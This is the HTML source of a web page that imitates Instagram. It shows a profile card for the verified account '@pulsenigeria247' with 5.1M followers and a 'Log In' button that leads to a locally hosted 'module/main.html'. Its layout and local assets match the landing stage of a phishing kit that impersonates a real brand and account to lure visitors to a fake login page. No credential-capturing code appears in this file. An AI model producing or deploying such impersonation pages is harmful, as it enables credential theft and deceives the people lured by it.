<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
        <!-- Css stylesheet links below -->
        <!-- Bootstrap link -->
        <link rel="stylesheet" href="module/css/bootstrap.css">
        <!-- External stylesheet -->
        <link rel="stylesheet" href="module/css/style.css">
        <link rel="stylesheet" href="module/css/structure.css">

        <link rel="icon" href="./module/img/instagramlogo.png">

        <title>Instagram</title>
    </head>
    <body>
        <!-- Parent container-->
        <div class="social-parent-con mx-auto">

            <!-- Header container -->
            <div class="social-con">
                <div class="container" >
                    <div class="col-12 col-md-11 col-lg-11 mx-auto">
                        
                        <div class="social-main-con">
                            <div class="social-top-con">
                                <div class="row align-items-center">
                                    <div class="col-12 col-md-10 col-lg-6 mx-auto">
                                        <div class="social-img"><img src="module/img/instagramlogo.png" class="img-fluid"></div>
                                        <div class="facebook-social-display instagram-social"><img src="module/img/instagramsocial.png" class="img-fluid"></div>
                                    </div>
                            
                                    <!-- Sign In container -->
                                    <div class="col-12 col-md-10 col-lg-6 mx-auto">
                                        <div class="social-input-con">
                                            <div class="img-wrap"><div class="header-img-white"><img src="module/img/pulse.png" class="img-fluid"></div></div>
                                            <p class="main-txt">@pulsenigeria247 is on Instagram. To connect with pulsenigeria247, log in or create an account.</p>
                                            <div class="ind-row">
                                                <div class="right-side one-line">5.1M Followers</div>
                                                <div class="left-side one-line">Verified <img src="module/img/verify.png" class="left-img"></div>
                                            </div>
                                            
                                            <div class="col-12">
                                                <div class="social-btn" onclick="document.location.href='module/main.html'">Log In</div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            
                            <div class="social-bot-con">
                                <div class="col-12 col-md-10 col-lg-6 mx-auto">
                                    <div class="social-logo mx-auto"><img src="module/img/socialinstagram.png" class="img-fluid"></div>	
                                </div>
                            </div>
                            
                        </div>
                        
                    </div>
                </div>
            </div>

        </div>
    </body>
    <!-- -------------------- -------------------- -------------------- -->
    <!-- -------------------- -------------------- -------------------- -->
    <script src="module/js/bootstrap.js"></script>
</html>
